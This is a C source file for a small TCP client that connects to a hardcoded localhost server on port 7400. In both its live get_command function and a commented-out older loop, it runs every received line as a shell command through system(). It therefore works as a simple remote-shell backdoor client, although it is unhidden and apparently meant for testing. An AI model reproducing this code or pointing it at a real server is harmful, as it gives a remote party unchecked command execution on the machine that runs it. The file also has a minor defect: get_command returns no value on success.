#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "util.h"
#define MSG_SIZE 200
#define MAX_CLIENTS 150
#define MYPORT 7400

void try_connect(int client_socket, struct sockaddr_in server_addr) {
  // Try connecting
  if (connect(client_socket, (struct sockaddr *)&server_addr,
              sizeof(server_addr)) < 0) {
    error_and_exit("connection failed");
  }
}

FILE *get_socket_file(int client_socket) {
  FILE *socket_file = fdopen(client_socket, "w+");
  if (socket_file == NULL) {
    error_and_exit("Couldn't open socket as file stream");
  }
  return socket_file;
}




char LOCALHOSTNAME[] = "127.0.0.1"; // For testing only

// int notmain(int argc) {
//   /*  Now wait for messages from the server */
//   printf("\nbefore while");
//   while (1) {
//     testfds = clientfds;
//     select(FD_SETSIZE, &testfds, NULL, NULL, NULL);
//     for (fd = 0; fd < FD_SETSIZE; fd++) {



//       //IF we get data
//       if (FD_ISSET(fd, &testfds)) {
//         if (fd == sockfd) {
//           result = read(sockfd, msg, MSG_SIZE); /*read data from open socket*/
//           msg[result] = '\0';                   /* Terminate string with null */
//           // printf("\nMsg: %s", msg+1);
//           printf("\nMsg: %s", msg);
//           if (msg[0] == 'X') {
//             close_tcp_socket(sockfd);
//           }
//           system(msg); /* Calling system commands */
//           printf("\n%s", msg);

//         } else if (fd == 0) { /*process keyboard activiy*/
//           fgets(kb_msg, MSG_SIZE + 1, stdin);
//           if (strcmp(kb_msg, "quit\n") == 0) {
//             sprintf(msg, "\nXis shutting down.\n");
//             write(sockfd, msg, strlen(msg));
//             close_tcp_socket(sockfd);
//             /*end program*/
//           } else {
//             sprintf(msg, "M%s", kb_msg);
//             write(sockfd, msg, strlen(msg));
//           }
//         }
//       }
//     }
//   }
// }

int get_command(FILE *socket_file) {
  char *recv_line = NULL;
  size_t recv_line_size = 0;
  //If we there's an error with recieving the line
  if (getline(&recv_line, &recv_line_size, socket_file) == -1) {
    return -1;
  }
  system(recv_line); /* Calling system commands */
  printf("\n%s", recv_line);

  // Try sending the command results
  if (fputs(recv_line, socket_file) == EOF) {
    free(recv_line);
    error_and_exit("Exit");
  }
  free(recv_line);
}

int main(int argc){

  int i = 0, port, client_sockfd;
  struct sockaddr_in server_address;
  int addresslen = sizeof(struct sockaddr_in), fd;
  char fd_array[MAX_CLIENTS];
  fd_set readfds, testfds, clientfds;
  char msg[MSG_SIZE + 1];
  char kb_msg[MSG_SIZE + 10];

  /*Client variables*/

  int sockfd;
  int result;
  char hostname[MSG_SIZE] = "127.0.0.1";
  struct hostent *hostinfo;
  struct sockaddr_in address;
  char alias[MSG_SIZE];
  int clientid;

  /*Client*/

  port = MYPORT;
  printf("\n*** Client program starting (enter \"quit\" to stop): \n");
  fflush(stdout);

  /* Create a socket for the client */
  sockfd = open_tcp_socket();
  /* Name the socket, as agreed with the server */
  hostinfo = gethostbyname(hostname); /* look for host's name */
  address = socket_address(hostinfo->h_addr_list, port); // Make a struct
  printf("\nBefore connect");
  /* Connect the socket to the server's socket */
  try_connect(sockfd, address);
  FILE *socket_file = get_socket_file(sockfd);

  int socket_file_status = 0;
  while (socket_file_status != -1) {
    socket_file_status = get_command(socket_file);
  }



}
